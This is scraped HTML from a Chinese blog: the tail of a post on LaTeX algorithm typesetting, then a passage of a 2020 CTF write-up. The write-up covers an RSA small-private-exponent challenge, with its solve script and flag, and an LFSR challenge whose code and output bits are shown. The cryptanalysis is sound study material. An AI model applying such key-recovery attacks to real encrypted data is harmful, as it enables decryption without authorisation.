<span class="keyword">\rm</span>&#123;or&#125; <span class="built_in">$</span>t&gt;maxIter<span class="built_in">$</span>&#125;  </span><br><span class="line">    &#123;  </span><br><span class="line">      t = t+1<span class="keyword">\;</span>  </span><br><span class="line">      <span class="keyword">\For</span>&#123;<span class="built_in">$</span>n=1;n <span class="keyword">\le</span> N;n++<span class="built_in">$</span>&#125;  </span><br><span class="line">      &#123;  </span><br><span class="line">        <span class="built_in">$</span><span class="keyword">\bm</span>&#123;W&#125; = <span class="keyword">\bm</span>&#123;W&#125;+<span class="keyword">\eta</span><span class="keyword">\big</span>(1-<span class="keyword">\sigma</span><span class="keyword">\left</span>(<span class="keyword">\vec</span>&#123;<span class="keyword">\varphi</span>&#125;<span class="built_in">_</span>n<span class="built_in">^</span>T<span class="keyword">\bm</span>&#123;W&#125;<span class="keyword">\vec</span>&#123;y&#125;<span class="built_in">_</span>n<span class="keyword">\right</span>)<span class="keyword">\big</span>)<span class="keyword">\vec</span>&#123;<span class="keyword">\varphi</span>&#125;<span class="built_in">_</span>n<span class="keyword">\vec</span>&#123;y&#125;<span class="built_in">_</span>n<span class="built_in">^</span>T<span class="built_in">$</span><span class="keyword">\;</span><span class="keyword">\label</span>&#123;algline:W&#125;  </span><br><span class="line">        <span class="keyword">\For</span>&#123;<span class="built_in">$</span>m<span class="keyword">\in</span> S<span class="built_in">_</span>n<span class="built_in">$</span>&#125;  </span><br><span class="line">        &#123;  </span><br><span class="line">            <span class="built_in">$</span><span class="keyword">\vec</span>&#123;v&#125;<span class="built_in">_</span>m=<span class="keyword">\vec</span>&#123;v&#125;<span class="built_in">_</span>m+ <span class="keyword">\eta</span><span class="keyword">\left</span>(1-<span class="keyword">\sigma</span><span class="keyword">\left</span>(<span class="keyword">\vec</span>&#123;<span class="keyword">\varphi</span>&#125;<span class="built_in">_</span>n<span class="built_in">^</span>T<span class="keyword">\bm</span>&#123;W&#125;<span class="keyword">\vec</span>&#123;y&#125;<span class="built_in">_</span>n<span class="keyword">\right</span>)<span class="keyword">\right</span>)r<span class="built_in">_</span>&#123;m,n&#125;<span class="keyword">\bm</span>&#123;W&#125;<span class="keyword">\vec</span>&#123;y&#125;<span class="built_in">_</span>n<span class="built_in">$</span><span class="keyword">\;</span><span class="keyword">\label</span>&#123;algline:V&#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">\For</span>&#123;<span class="built_in">$</span>i=1;i<span class="keyword">\le</span> k;i++<span class="built_in">$</span>&#125;  </span><br><span class="line">        &#123;  </span><br><span class="line">            sample negative sample <span class="built_in">$</span><span class="keyword">\vec</span>&#123;y&#125;<span class="built_in">_</span>i<span class="built_in">$</span> from <span class="built_in">$</span>P<span class="built_in">_</span>n<span class="built_in">$</span><span class="keyword">\;</span>  </span><br><span class="line">            <span class="built_in">$</span><span class="keyword">\bm</span>&#123;W&#125; = <span class="keyword">\bm</span>&#123;W&#125;-<span class="keyword">\eta</span><span class="keyword">\big</span>(1-<span class="keyword">\sigma</span><span class="keyword">\left</span>(-<span class="keyword">\vec</span>&#123;<span class="keyword">\varphi</span>&#125;<span class="built_in">_</span>n<span class="built_in">^</span>T<span class="keyword">\bm</span>&#123;W&#125;<span class="keyword">\vec</span>&#123;y&#125;<span class="built_in">_</span>n<span class="keyword">\right</span>)<span class="keyword">\big</span>)<span class="keyword">\vec</span>&#123;<span class="keyword">\varphi</span>&#125;<span class="built_in">_</span>n<span class="keyword">\vec</span>&#123;y&#125;<span class="built_in">_</span>i<span class="built_in">^</span>T<span class="built_in">$</span><span class="keyword">\;</span>  </span><br><span class="line">            <span class="keyword">\For</span>&#123;<span class="built_in">$</span>m<span class="keyword">\in</span> S<span class="built_in">_</span>n<span class="built_in">$</span>&#125;  </span><br><span class="line">            &#123;  </span><br><span class="line">                <span class="built_in">$</span><span class="keyword">\vec</span>&#123;v&#125;<span class="built_in">_</span>m=<span class="keyword">\vec</span>&#123;v&#125;<span class="built_in">_</span>m- <span class="keyword">\eta</span><span class="keyword">\left</span>(1-<span class="keyword">\sigma</span><span class="keyword">\left</span>(-<span class="keyword">\vec</span>&#123;<span class="keyword">\varphi</span>&#125;<span class="built_in">_</span>n<span class="built_in">^</span>T<span class="keyword">\bm</span>&#123;W&#125;<span class="keyword">\vec</span>&#123;y&#125;<span class="built_in">_</span>n<span class="keyword">\right</span>)<span class="keyword">\right</span>)r<span class="built_in">_</span>&#123;m,n&#125;<span class="keyword">\bm</span>&#123;W&#125;<span class="keyword">\vec</span>&#123;y&#125;<span class="built_in">_</span>i<span class="built_in">$</span><span class="keyword">\;</span>  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">      &#125;  </span><br><span class="line">      <span class="built_in">$</span><span class="keyword">\bm</span>&#123;W&#125; = <span class="keyword">\bm</span>&#123;W&#125;-2<span class="keyword">\lambda</span><span class="keyword">\eta</span><span class="keyword">\bm</span>&#123;W&#125;<span class="built_in">$</span><span class="keyword">\;</span>  </span><br><span class="line">      <span class="built_in">$</span>V=V-2<span class="keyword">\lambda</span><span class="keyword">\eta</span> V<span class="built_in">$</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">    return <span class="built_in">$</span><span class="keyword">\bm</span>&#123;W&#125;,V<span class="built_in">$</span><span class="keyword">\;</span>  </span><br><span class="line"><span class="keyword">\end</span>&#123;algorithmic&#125;  </span><br><span class="line"><span class="keyword">\end</span>&#123;algorithm&#125;  </span><br></pre></td></tr></table></figure>
<p>你的word就会有一个这个了，是不是很美观。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/asghashdgaksd.png" alt="asghashdgaksd"></p>
<p>如果你不喜欢这种风格的，还有其他的，往下看</p>
<h2 id="0x02-MiKTeX-的-TeXworks"><a href="#0x02-MiKTeX-的-TeXworks" class="headerlink" title="0x02 MiKTeX 的 TeXworks"></a>0x02 MiKTeX 的 TeXworks</h2><p>如果上面的word安装始终跑不起来的话，那就将就一下，就用TeXworks吧，效果也是很好的。</p>
<p>直接在TeXworks中输入下列的代码。然后安装默认方式进行运行，就可以看到一个很优美的玩意。前提是你已经安装了必须的包。</p>
<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\documentclass</span>[11pt]&#123;article&#125;</span><br><span class="line"><span class="keyword">\usepackage</span>&#123;CJK&#125;</span><br><span class="line"><span class="keyword">\usepackage</span>[top=2cm, bottom=2cm, left=2cm, right=2cm]&#123;geometry&#125;</span><br><span class="line"><span class="keyword">\usepackage</span>&#123;algorithm&#125;</span><br><span class="line"><span class="keyword">\usepackage</span>&#123;algorithmicx&#125;</span><br><span class="line"><span class="keyword">\usepackage</span>&#123;algpseudocode&#125;</span><br><span class="line"><span class="keyword">\usepackage</span>&#123;amsmath&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">\floatname</span>&#123;algorithm&#125;&#123;算法&#125;</span><br><span class="line"><span class="keyword">\renewcommand</span>&#123;<span class="keyword">\algorithmicrequire</span>&#125;&#123;<span class="keyword">\textbf</span>&#123;输入:&#125;&#125;</span><br><span class="line"><span class="keyword">\renewcommand</span>&#123;<span class="keyword">\algorithmicensure</span>&#125;&#123;<span class="keyword">\textbf</span>&#123;输出:&#125;&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">\begin</span>&#123;document&#125;</span><br><span class="line"><span class="keyword">\begin</span>&#123;CJK*&#125;&#123;UTF8&#125;&#123;gkai&#125;</span><br><span class="line">    <span class="keyword">\begin</span>&#123;algorithm&#125;</span><br><span class="line">        <span class="keyword">\caption</span>&#123;用归并排序求逆序数&#125;</span><br><span class="line">        <span class="keyword">\begin</span>&#123;algorithmic&#125;[1] <span class="comment">%每行显示行号</span></span><br><span class="line">            <span class="keyword">\Require</span> <span class="built_in">$</span>Array<span class="built_in">$</span>数组，<span class="built_in">$</span>n<span class="built_in">$</span>数组大小</span><br><span class="line">            <span class="keyword">\Ensure</span> 逆序数</span><br><span class="line">            <span class="keyword">\Function</span> &#123;MergerSort&#125;&#123;<span class="built_in">$</span>Array, left, right<span class="built_in">$</span>&#125;</span><br><span class="line">                <span class="keyword">\State</span> <span class="built_in">$</span>result <span class="keyword">\gets</span> 0<span class="built_in">$</span></span><br><span class="line">                <span class="keyword">\If</span> &#123;<span class="built_in">$</span>left &lt; right<span class="built_in">$</span>&#125;</span><br><span class="line">                    <span class="keyword">\State</span> <span class="built_in">$</span>middle <span class="keyword">\gets</span> (left + right) / 2<span class="built_in">$</span></span><br><span class="line">                    <span class="keyword">\State</span> <span class="built_in">$</span>result <span class="keyword">\gets</span> result +<span class="built_in">$</span> <span class="keyword">\Call</span>&#123;MergerSort&#125;&#123;<span class="built_in">$</span>Array, left, middle<span class="built_in">$</span>&#125;</span><br><span class="line">                    <span class="keyword">\State</span> <span class="built_in">$</span>result <span class="keyword">\gets</span> result +<span class="built_in">$</span> <span class="keyword">\Call</span>&#123;MergerSort&#125;&#123;<span class="built_in">$</span>Array, middle, right<span class="built_in">$</span>&#125;</span><br><span class="line">                    <span class="keyword">\State</span> <span class="built_in">$</span>result <span class="keyword">\gets</span> result +<span class="built_in">$</span> <span class="keyword">\Call</span>&#123;Merger&#125;&#123;<span class="built_in">$</span>Array,left,middle,right<span class="built_in">$</span>&#125;</span><br><span class="line">                <span class="keyword">\EndIf</span></span><br><span class="line">                <span class="keyword">\State</span> <span class="keyword">\Return</span>&#123;<span class="built_in">$</span>result<span class="built_in">$</span>&#125;</span><br><span class="line">            <span class="keyword">\EndFunction</span></span><br><span class="line">            <span class="keyword">\State</span></span><br><span class="line">            <span class="keyword">\Function</span>&#123;Merger&#125;&#123;<span class="built_in">$</span>Array, left, middle, right<span class="built_in">$</span>&#125;</span><br><span class="line">                <span class="keyword">\State</span> <span class="built_in">$</span>i<span class="keyword">\gets</span> left<span class="built_in">$</span></span><br><span class="line">                <span class="keyword">\State</span> <span class="built_in">$</span>j<span class="keyword">\gets</span> middle<span class="built_in">$</span></span><br><span class="line">                <span class="keyword">\State</span> <span class="built_in">$</span>k<span class="keyword">\gets</span> 0<span class="built_in">$</span></span><br><span class="line">                <span class="keyword">\State</span> <span class="built_in">$</span>result <span class="keyword">\gets</span> 0<span class="built_in">$</span></span><br><span class="line">                <span class="keyword">\While</span>&#123;<span class="built_in">$</span>i&lt;middle<span class="built_in">$</span> <span class="keyword">\textbf</span>&#123;and&#125; <span class="built_in">$</span>j&lt;right<span class="built_in">$</span>&#125;</span><br><span class="line">                    <span class="keyword">\If</span>&#123;<span class="built_in">$</span>Array[i]&lt;Array[j]<span class="built_in">$</span>&#125;</span><br><span class="line">                        <span class="keyword">\State</span> <span class="built_in">$</span>B[k++]<span class="keyword">\gets</span> Array[i++]<span class="built_in">$</span></span><br><span class="line">                    <span class="keyword">\Else</span></span><br><span class="line">                        <span class="keyword">\State</span> <span class="built_in">$</span>B[k++] <span class="keyword">\gets</span> Array[j++]<span class="built_in">$</span></span><br><span class="line">                        <span class="keyword">\State</span> <span class="built_in">$</span>result <span class="keyword">\gets</span> result + (middle - i)<span class="built_in">$</span></span><br><span class="line">                    <span class="keyword">\EndIf</span></span><br><span class="line">                <span class="keyword">\EndWhile</span></span><br><span class="line">                <span class="keyword">\While</span>&#123;<span class="built_in">$</span>i&lt;middle<span class="built_in">$</span>&#125;</span><br><span class="line">                    <span class="keyword">\State</span> <span class="built_in">$</span>B[k++] <span class="keyword">\gets</span> Array[i++]<span class="built_in">$</span></span><br><span class="line">                <span class="keyword">\EndWhile</span></span><br><span class="line">                <span class="keyword">\While</span>&#123;<span class="built_in">$</span>j&lt;right<span class="built_in">$</span>&#125;</span><br><span class="line">                    <span class="keyword">\State</span> <span class="built_in">$</span>B[k++] <span class="keyword">\gets</span> Array[j++]<span class="built_in">$</span></span><br><span class="line">                <span class="keyword">\EndWhile</span></span><br><span class="line">                <span class="keyword">\For</span>&#123;<span class="built_in">$</span>i = 0 <span class="keyword">\to</span> k-1<span class="built_in">$</span>&#125;</span><br><span class="line">                    <span class="keyword">\State</span> <span class="built_in">$</span>Array[left + i] <span class="keyword">\gets</span> B[i]<span class="built_in">$</span></span><br><span class="line">                <span class="keyword">\EndFor</span></span><br><span class="line">                <span class="keyword">\State</span> <span class="keyword">\Return</span>&#123;<span class="built_in">$</span>result<span class="built_in">$</span>&#125;</span><br><span class="line">            <span class="keyword">\EndFunction</span></span><br><span class="line">        <span class="keyword">\end</span>&#123;algorithmic&#125;</span><br><span class="line">    <span class="keyword">\end</span>&#123;algorithm&#125;</span><br><span class="line"><span class="keyword">\end</span>&#123;CJK*&#125;</span><br><span class="line"><span class="keyword">\end</span>&#123;document&#125;</span><br></pre></td></tr></table></figure>
<p>就是这样子：</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/sort.png" alt="归并排序模板"></p>
<h4 id="关于自定义模块包-自动安装搜索不到的"><a href="#关于自定义模块包-自动安装搜索不到的" class="headerlink" title="关于自定义模块包/自动安装搜索不到的"></a>关于自定义模块包/自动安装搜索不到的</h4><p>上述方法基本都实现了想要的功能了，对于缺少的模块都可以自己进行添加。直接在 MiKTeX 的 console 中搜索安装就行。并且绝大多数情况都推荐使用这种方式进行安装。只有极少数情况下，某些包不在其服务器列表中，例如某些期刊论文的格式时需要自定义一个 <code>sty</code> 或者官方提供了一个，这时候也不需要手动去安装，只需要把这个 <code>sty</code> 文件和写好的 latex 的源码放在一个目录下就可以找到了。</p>
<h2 id="0x03-其他好看的模板"><a href="#0x03-其他好看的模板" class="headerlink" title="0x03 其他好看的模板"></a>0x03 其他好看的模板</h2><p>其实还有很多好看的模板我就不一一赘述了。直接给个参考的网站吧。</p>
<p>很多的模板，但是不排除有语法错误，需要自己修稿。链接：<a target="_blank" rel="noopener" href="https://www.shangmayuan.com/a/1485d36c6aec46ebb02482d1.html">https://www.shangmayuan.com/a/1485d36c6aec46ebb02482d1.html</a></p>
<h2 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h2><p>参考链接1：<a target="_blank" rel="noopener" href="http://www.yuerya.me/post/aurora-%7C-latex-in-word">http://www.yuerya.me/post/aurora-%7C-latex-in-word</a></p>
<p>参考链接2：<a target="_blank" rel="noopener" href="http://hustsxh.is-programmer.com/posts/38801.html">http://hustsxh.is-programmer.com/posts/38801.html</a></p>
<p>参考链接3：<a target="_blank" rel="noopener" href="https://www.shangmayuan.com/a/1485d36c6aec46ebb02482d1.html">https://www.shangmayuan.com/a/1485d36c6aec46ebb02482d1.html</a></p>
<p>参考链接4（最重要）：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/704863910bab">https://www.jianshu.com/p/704863910bab</a></p>
<p>手动安装sty：<a target="_blank" rel="noopener" href="https://www.zhihu.com/question/26584112">https://www.zhihu.com/question/26584112</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://lucxer.tk/2020/09/15/latex%E9%85%8D%E7%BD%AE/" data-id="ckja3vkpo000314ln337rg2j3" data-title="Windows 下 latex 配置" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/MiKTeX/" rel="tag">MiKTeX</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Windows/" rel="tag">Windows</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/latex/" rel="tag">latex</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%85%8D%E7%BD%AE/" rel="tag">配置</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2020国赛觅马" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/08/30/2020%E5%9B%BD%E8%B5%9B%E8%A7%85%E9%A9%AC/" class="article-date">
  <time class="dt-published" datetime="2020-08-30T13:21:19.000Z" itemprop="datePublished">2020-08-30</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/CTF/">CTF</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/08/30/2020%E5%9B%BD%E8%B5%9B%E8%A7%85%E9%A9%AC/">2020国赛觅马wp</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <blockquote>
<p>本篇是对《第十三届全国大学生信息安全竞赛创新实践能力赛（线上初赛）》参赛经历的一个整理。</p>
</blockquote>
<h2 id="bd"><a href="#bd" class="headerlink" title="bd"></a>bd</h2><p>题目描述如此：</p>
<blockquote>
<p>数学在密码学里面很重要的！现在知道吃亏了吧！</p>
</blockquote>
<p>显然，他说的是大实话，确实应该好好学习数学。</p>
<p>下载附件，可以看到里面是一个py文件，文件内容如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">N = p * q</span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    d = getRandomNBitInteger(<span class="number">200</span>)</span><br><span class="line">    <span class="keyword">if</span> GCD(d, phi) == <span class="number">1</span>:</span><br><span class="line">        e = inverse(d, phi)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, N)</span><br><span class="line"></span><br><span class="line">print(c, e, N, sep=<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 37625098109081701774571613785279343908814425141123915351527903477451570893536663171806089364574293449414561630485312247061686191366669404389142347972565020570877175992098033759403318443705791866939363061966538210758611679849037990315161035649389943256526167843576617469134413191950908582922902210791377220066</span></span><br><span class="line"><span class="comment"># 46867417013414476511855705167486515292101865210840925173161828985833867821644239088991107524584028941183216735115986313719966458608881689802377181633111389920813814350964315420422257050287517851213109465823444767895817372377616723406116946259672358254060231210263961445286931270444042869857616609048537240249</span></span><br><span class="line"><span class="comment"># 86966590627372918010571457840724456774194080910694231109811773050866217415975647358784246153710824794652840306389428729923771431340699346354646708396564203957270393882105042714920060055401541794748437242707186192941546185666953574082803056612193004258064074902605834799171191314001030749992715155125694272289</span></span><br></pre></td></tr></table></figure>


<p>打开映入眼帘的就是pq等字样，毫无疑问，多半是一个RSA了。</p>
<p>然后，再对代码逐行看过之后，看到11行，<strong>生成的d是比较小的</strong>，同时可以看到21行打印的<strong>e是比较大的</strong>（和n相比）。</p>
<p>因此，这个是一个妥妥的 <code>RSA小解密指数攻击</code> 的题目。（常规题型，不了解请Google一下）</p>
<p>于是，贴上解密代码，一瞬得到flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> myrsa <span class="keyword">import</span> hack_d, decrypt</span><br><span class="line"></span><br><span class="line">n = <span class="number">86966590627372918010571457840724456774194080910694231109811773050866217415975647358784246153710824794652840306389428729923771431340699346354646708396564203957270393882105042714920060055401541794748437242707186192941546185666953574082803056612193004258064074902605834799171191314001030749992715155125694272289</span></span><br><span class="line">e = <span class="number">46867417013414476511855705167486515292101865210840925173161828985833867821644239088991107524584028941183216735115986313719966458608881689802377181633111389920813814350964315420422257050287517851213109465823444767895817372377616723406116946259672358254060231210263961445286931270444042869857616609048537240249</span></span><br><span class="line">c = <span class="number">37625098109081701774571613785279343908814425141123915351527903477451570893536663171806089364574293449414561630485312247061686191366669404389142347972565020570877175992098033759403318443705791866939363061966538210758611679849037990315161035649389943256526167843576617469134413191950908582922902210791377220066</span></span><br><span class="line"></span><br><span class="line">d = hack_d(e, n)</span><br><span class="line"></span><br><span class="line">flag = decrypt(c, d, n)[<span class="number">0</span>]</span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;d3752538-90d0-c373-cfef-9247d3e16848&#125;</span></span><br></pre></td></tr></table></figure>


<h2 id="lfsr"><a href="#lfsr" class="headerlink" title="lfsr"></a>lfsr</h2><p>题目描述如下：</p>
<blockquote>
<p>弱鸡看着题目给的信息束手无策，丈二和尚摸不着头脑 ，你嘿嘿一笑，拿出来了你随身带着的笔记本电脑，噼里啪啦的敲起来了键盘，清晰的函数逻辑和流程出现在了电脑屏幕上，你敲敲键盘，答案变出现在了电脑屏幕上。</p>
</blockquote>
<p>读完题目描述，觉得这段话索然无味。。。。。。</p>
<p>还是依旧下载文件，里面是两个文件，一个是加密的程序，另一个是程序的输出。</p>
<p>加密程序 <code>lfsr.py</code> 如下：（注释都是我打的，原文是没有的）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">N = <span class="number">100</span></span><br><span class="line">MASK = <span class="number">2</span>**(N+<span class="number">1</span>) - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span>(<span class="params">state, mask</span>):</span></span><br><span class="line">    feedback = state &amp; mask</span><br><span class="line">    feed_bit = <span class="built_in">bin</span>(feedback)[<span class="number">2</span>:].count(<span class="string">&quot;1&quot;</span>) &amp; <span class="number">1</span>  <span class="comment"># feed_bit feedback中二进制位中1的个数是奇数个就是1</span></span><br><span class="line">    output_bit = state &amp; <span class="number">1</span> <span class="comment"># 输出位就是 state的奇偶 所以初始的state就是偶数  所以output里面前某位（最多100位）联合起来就是初始state</span></span><br><span class="line">    state = (state &gt;&gt; <span class="number">1</span>) | (feed_bit &lt;&lt; (N-<span class="number">1</span>)) <span class="comment"># 就是把feed_bit填入最高位</span></span><br><span class="line">    <span class="keyword">return</span> state, output_bit</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">assert</span> flag.startswith(<span class="string">&quot;flag&#123;&quot;</span>)</span><br><span class="line">    <span class="keyword">assert</span> flag.endswith(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    mask = <span class="built_in">int</span>(flag[<span class="number">5</span>:-<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">assert</span> mask.bit_length() == N</span><br><span class="line">    </span><br><span class="line">    state  = random.randint(<span class="number">0</span>, MASK) <span class="comment"># 最多100位</span></span><br><span class="line">    print(state)</span><br><span class="line">    </span><br><span class="line">    outputs = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(N**<span class="number">2</span>):</span><br><span class="line">        state, output_bit = lfsr(state, mask)</span><br><span class="line">        outputs += <span class="built_in">str</span>(output_bit)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(outputs)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
<p>输出文件 <code>output.txt</code> 如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0100110011101111011111011010100111001010010100001111110110111101011110011111010010010111011100110111011001100001010010011101101000110110000011111011110000010100001001000011001011011011011001111110101111001010011011100010011110101100100101111001011100011110111101001010000000100100000111100101100100100000100110001111110011100110101000110100011001110110000110111111010111000001101110011001101111010110101000101011110111001011001111111000100100100011100100010101001100111011101111100110101011101101001001110010111011010011111001100001111111100001000001101101000001010100110011001101000101001010001001011000010111111100101111000000101000010110100110101001001100100011000111101000110011110101101111100110101010101000000001110010101001001111101001010111011110110001100101001111110111000110101011011010110101100011110010000011000110010111101010010000011101110111100011011110110001111010101011101100101101001111100100011000100101111011110001111100000110111000111111000111100000110011011011111110011111100010010110000010011100001010101011011101100011001100101100011001010010001101010011000000011110110111000000110001010010111110101011100000010100100001101011010101100110000101100010001010010111011000100001000001001110101011000010111000000010101100001010000010110110000111100011011000010111001111101110111010110000011001011101100000100000100010100100000010011010000111110010001111010000100011110000101111000110100010110101110001011101101100111000001110100100000000010011001110101110000001101100000001010111010011111000101101011001010011001101000111000010111111010101000011011001001110000011100100100010110101100001110110111001000001011111100101100011010010010110000011110100110000111011011010101110101001100110100101100101000100011001011000001011110010000011000110111011110011010001101100010010111110101101101110100111010000001101000011011010011110111101000000100011000000101001000000011010101010000100001110110000110011000111101011100100101111101111111110101000011010001101100010010100111000000010000101100100110101000001001011100011111001101001101100010100000111010101111011101111111101100000010000111110011101010100101110100101010100011110100100000111010001000100011010011100010011000001110110100110110010100100110111011001010010010100000110101110000011110010110100010101000110000111101011011010111101100111100101001101001101100111101000100101101100010111010010111100100111101101110101110011010110011111011111010000011000100010010101110001001000111111100100010100000001001010111010100010111001011011101110010110111110110100011111101110111011000111001010010110001001011011100110101111100100000101110000001011110011101110101101001011111100011001100111001011011001011011101000101100100011101000011101011010110010111111010011110111111111100001101101001101101111000100110010010100000100000100110100100110010000100101100000101010101000111110101001111111011011111101101110010100110000010110111001101110011101100001111111001110110010010011101111100111111000010011010010011100000001010011111111110001111110110110110001001001111011001101110110101100011010001111110010001011010000011110101100110010010001110010100010000000010101010010111011010101011011000010010011010110101101011100100101110001100000111110010101100010100010100010000101111000011111000111000011110001110110000011000100110010101111111111100011010000010010010111111110000000010100100101101101010111011000001010000000101011010110011101000110011011001110101101001001101100010011110001101001001000011001101100001101100000101111000001110100001100001000100000000011010011001001011110011000011011000100011011001011100111111000011011010000100000011110110011011110111000001011101101110110101000101011111110000100000111111110011111111100010101001000011010001110111111011100010111001110110001000101010001001001111111110111001101001001000110000110100000000010010100001010111101001110001011101011000100000001001001011111000100011111000011010001110001111111110111100010001110101011101011100010100000011110000100011001100000100111000111011011101000110010011010011110010010000111010001011111111010110011100111011110100111000101100100111001001010001000100011110101100100010000000000110010111101101111101011001101111000000000100000101001011110000010011110011000000100111001001110001000010011111010100001001010010100111111010111001001110110101010010100010010100101100000001010010111101101000110100111110000000111110000011110011001101010111101010111010111010000000110010001011110101110110001000110111101110101101001001100001101110001000100000110100000100000111110010110110010011111100010011111001110111011010101010001011111110000000011110001010011001101010110010101100101100110010111001100100111101000100010100010010100000010010111101100111110101101111101001010110010001111111001101010111110101111001000111101001110100000111111010000111000010101001001101100111001111111111100011010111110001101000100001010000000001101101001110001000001110010000010110001001001101010111111001001010100011011111011000011001001101000110010101000010100001001000011111001101101111011111001000010010